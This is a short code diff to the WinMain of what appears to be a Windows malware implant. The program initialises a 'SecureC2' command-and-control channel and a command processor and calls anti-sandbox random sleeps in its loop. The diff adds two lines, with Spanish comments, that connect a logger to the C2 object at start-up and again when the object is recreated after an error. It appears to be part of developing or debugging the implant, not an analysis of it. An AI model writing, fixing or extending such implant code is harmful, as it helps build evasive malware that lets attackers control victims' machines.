@@ -1210,6 +1210,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     
     logger.Log("Inicializando C2");
     SecureC2 c2;
+    c2.SetLogger(&logger);  // <--- LÍNEA AÑADIDA - CONECTA EL LOGGER
     CommandProcessor cmdProc(&c2);
     
     antiSandbox.SleepRandom();
@@ -1239,6 +1240,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
             antiSandbox.SleepRandom();
         } catch (...) {
             c2 = SecureC2();
+            c2.SetLogger(&logger);  // <--- TAMBIÉN AQUÍ AL RECREAR
             antiSandbox.SleepRandom();
         }
     }
